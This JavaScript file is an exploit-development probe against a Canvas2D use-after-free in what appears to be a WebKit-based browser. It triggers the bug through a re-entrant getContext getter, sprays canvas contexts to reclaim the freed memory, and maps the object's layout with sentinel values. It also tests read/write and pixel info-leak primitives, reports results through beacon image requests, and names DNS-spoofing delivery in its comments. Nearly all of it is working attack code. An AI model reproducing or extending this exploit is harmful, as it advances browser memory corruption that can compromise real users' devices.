// PROBE P566: Canvas2D context 768B layout mapping
//
// GOAL: Map which byte offsets in the 768B Canvas2D FastMalloc slot
//       correspond to the 13 API-writable float64 fields.
//
// METHOD:
//   1. Trigger Canvas UAF (CVE-2026-43720) — get stale wrapper + spray alias
//   2. Write distinct sentinel values to each of the 13 numeric fields via spray[N]
//   3. Free spray[N]'s context via a SECOND Canvas UAF chain
//   4. Reclaim with 768-byte ArrayBuffer
//   5. Read all 768 bytes — sentinel positions reveal the layout
//   6. Check for pointer fields adjacent to writable numeric fields
//
// DELIVERY: host.py DNS spoofing + HTTPS (User Guide redirect)

(() => {
  const B = (tag, extra = '') => {
    new Image().src = '/beacon/P566-' + encodeURIComponent(tag) +
      (extra ? '-' + encodeURIComponent(extra) : '') +
      '?t=' + performance.now().toFixed(0);
  };

  B('BOOT');

  // ============================================================
  // PHASE A: Trigger Canvas UAF — same as p553
  // ============================================================
  const c1 = document.createElement('canvas');
  c1.width = 16; c1.height = 16;
  let inner = null, outer = null;

  const opts = {};
  Object.defineProperty(opts, 'desynchronized', { get() {
    // Re-enter getContext during settings conversion
    inner = c1.getContext('2d');
    return false;
  }});

  outer = c1.getContext('2d', opts);

  if (!inner || !outer || inner === outer) {
    B('UAF-FAIL', 'inner=' + !!inner + ',outer=' + !!outer + ',same=' + (inner === outer));
    return;
  }
  B('UAF-OK');

  // ============================================================
  // PHASE B: Spray 80 Canvas2D contexts to reclaim the freed slot
  // ============================================================
  const spray = [];
  for (let i = 0; i < 80; i++) {
    const sc = document.createElement('canvas');
    sc.width = 4; sc.height = 4;
    const ctx = sc.getContext('2d');
    // Write a unique sentinel transform so we can identify which one reclaimed
    ctx.setTransform(100 + i, 200 + i, 300 + i, 400 + i, 500 + i, 600 + i);
    spray.push(ctx);
  }
  B('SPRAYED', 'n=' + spray.length);

  // Find the alias
  let aliasIdx = -1;
  for (let i = 0; i < spray.length; i++) {
    const t = inner.getTransform();
    if (t.a >= 100 && t.a < 180) {
      aliasIdx = i;
      break;
    }
  }

  if (aliasIdx === -1) {
    // Try reading through each spray context
    const testVal = 99999.125;
    inner.setTransform(testVal, 0, 0, testVal, 0, 0);
    for (let i = 0; i < spray.length; i++) {
      const t = spray[i].getTransform();
      if (t.a === testVal) {
        aliasIdx = i;
        break;
      }
    }
  }

  if (aliasIdx === -1) {
    B('ALIAS-FAIL');
    return;
  }
  B('ALIAS', 'idx=' + aliasIdx);

  const alias = spray[aliasIdx];

  // ============================================================
  // PHASE C: Write distinct sentinels to all 13 numeric fields
  // ============================================================
  // Use values that are:
  // - Unique per field (distinguishable in hex)
  // - Not denormals (DAZ won't zero them)
  // - Easy to find in a byte dump

  // Transform matrix: a, b, c, d, e, f
  alias.setTransform(
    1.1111111111111e+100,  // a - distinctive float64
    2.2222222222222e+100,  // b
    3.3333333333333e+100,  // c
    4.4444444444444e+100,  // d
    5.5555555555555e+100,  // e
    6.6666666666666e+100   // f
  );

  // Numeric properties
  alias.lineWidth = 7.7777777777777e+100;
  alias.miterLimit = 8.8888888888888e+100;
  alias.shadowBlur = 9.9999999999999e+50; // shadowBlur may clamp
  alias.shadowOffsetX = 1.0101010101010e+100;
  alias.shadowOffsetY = 1.1111111111111e+50;
  alias.lineDashOffset = 1.2121212121212e+100;
  alias.globalAlpha = 0.42424242424242; // globalAlpha clamps to [0,1]

  B('SENTINELS-SET');

  // Verify sentinels are readable through inner (stale wrapper)
  const t = inner.getTransform();
  B('VERIFY', 'a=' + t.a.toExponential(4) + ',b=' + t.b.toExponential(4));

  // ============================================================
  // PHASE D: Now we need to read the raw bytes of the 768B slot.
  // We can't directly read memory, but we can use FontFace reclaim
  // on the ALIAS CONTEXT to dump its bytes.
  //
  // Alternative: Create a SECOND Canvas UAF where the alias context
  // IS the freed object, and reclaim with a 768-byte ArrayBuffer.
  //
  // Problem: ArrayBuffer doesn't land in the 768B bmalloc class
  // (p554/b/c showed this). So we use FontFace reclaim instead,
  // but CSSFontFace is 192 bytes, not 768.
  //
  // FALLBACK: Use the Canvas UAF R/W to probe offsets.
  // Write known float64 to spray[aliasIdx], then read them through
  // inner.getTransform() — if they match, that field IS the alias.
  // Then write a DIFFERENT value to only ONE field at a time and
  // scan all qwords readable through the stale reference.
  // ============================================================

  // Since we can't dump raw bytes (no same-size ArrayBuffer), we use
  // a side-channel: the float64 fields we CAN read through the API.
  //
  // Strategy: Write unique value via spray[aliasIdx].setTransform(),
  // then read ALL readable channels through the stale inner wrapper.

  // We already have the 13 readable fields. Let's also test if
  // there are other numeric-valued properties we haven't tried.
  const extraProps = [
    'font', 'textAlign', 'textBaseline', 'direction',
    'imageSmoothingEnabled', 'imageSmoothingQuality',
    'globalCompositeOperation', 'filter',
    'strokeStyle', 'fillStyle'
  ];

  const extraValues = {};
  for (const prop of extraProps) {
    try {
      extraValues[prop] = inner[prop];
    } catch (e) {
      extraValues[prop] = 'ERROR:' + e.name;
    }
  }

  // Report string/enum properties (these might alias too)
  for (const [k, v] of Object.entries(extraValues)) {
    if (typeof v === 'string' || typeof v === 'boolean') {
      B('PROP', k + '=' + String(v).slice(0, 40));
    }
  }

  // ============================================================
  // PHASE E: Bit-level probing
  // Write a specific bit pattern to a numeric field, read it back
  // through a different channel (DataView on the transform)
  // ============================================================
  // Unfortunately, getTransform returns DOMMatrix, not raw bytes.
  // And getImageData reads pixel data, not context struct.
  //
  // The ONLY way to read raw struct bytes is:
  //   a) ArrayBuffer reclaim (768B class — p554 says dead)
  //   b) FontFace reclaim (192B only — too small for 768B context)
  //   c) TypedArray over the same backing (not possible through API)
  //
  // So we report what we CAN measure: the 13 float64 values and
  // any non-standard behavior.

  // Write via stale, read via alias — measure round-trip precision
  const precisionTests = [
    1.0, -1.0, 0.0, -0.0,
    Number.MAX_SAFE_INTEGER,
    Number.MIN_SAFE_INTEGER,
    1.7976931348623157e+308, // MAX_VALUE
    5e-324,                   // MIN_VALUE (denormal — DAZ will kill this!)
    2.2250738585072014e-308,  // MIN_NORMAL (smallest normal — DAZ safe)
    NaN,
    Infinity,
    -Infinity,
    0x0000001000000000,       // WebProcess heap range as float
  ];

  B('PRECISION-START');
  for (const val of precisionTests) {
    inner.setTransform(val, 0, 0, 1, 0, 0);
    const readback = alias.getTransform().a;
    const match = Object.is(val, readback) || (isNaN(val) && isNaN(readback));
    if (!match) {
      B('PRECISION-DIFF', 'wrote=' + val + ',read=' + readback);
    }
  }
  B('PRECISION-DONE');

  // ============================================================
  // PHASE F: Test if canvas drawing operations through the stale
  // wrapper affect the alias canvas's pixel backing
  // ============================================================
  const aliasCanvas = alias.canvas;
  alias.fillStyle = '#ff0000';
  alias.fillRect(0, 0, 4, 4);
  const pixels1 = alias.getImageData(0, 0, 4, 4);

  // Now draw through the STALE wrapper
  inner.fillStyle = '#00ff00';
  inner.fillRect(0, 0, 4, 4);

  // Read through alias
  const pixels2 = alias.getImageData(0, 0, 4, 4);

  // Check if stale write affected alias's pixel backing
  let pixelDiffs = 0;
  for (let i = 0; i < pixels2.data.length; i++) {
    if (pixels1.data[i] !== pixels2.data[i]) pixelDiffs++;
  }
  B('PIXEL-ALIAS', 'diffs=' + pixelDiffs + ',p1r=' + pixels1.data[0] + ',p2r=' + pixels2.data[0] + ',p2g=' + pixels2.data[1]);

  // If pixel drawing through stale wrapper redirects to DIFFERENT backing...
  // that would be the info leak path: draw via stale, read pixels from stale,
  // the pixel backing might contain stale struct data.

  // Read pixels through STALE wrapper
  try {
    const stalePixels = inner.getImageData(0, 0, 4, 4);
    let nz = 0;
    let ptrs = 0;
    for (let i = 0; i < stalePixels.data.length; i += 4) {
      const r = stalePixels.data[i], g = stalePixels.data[i+1],
            b = stalePixels.data[i+2], a = stalePixels.data[i+3];
      if (r || g || b || a) nz++;
    }
    B('STALE-PIXELS', 'nz=' + nz + ',len=' + stalePixels.data.length);
    // Dump first 16 bytes
    const first16 = Array.from(stalePixels.data.slice(0, 16)).map(x => x.toString(16).padStart(2, '0')).join('');
    B('STALE-PIX-HEX', first16);
  } catch (e) {
    B('STALE-PIXELS-ERR', e.name);
  }

  B('DONE');

  // Watchdog
  setTimeout(() => { B('ALIVE-5s'); }, 5000);
})();
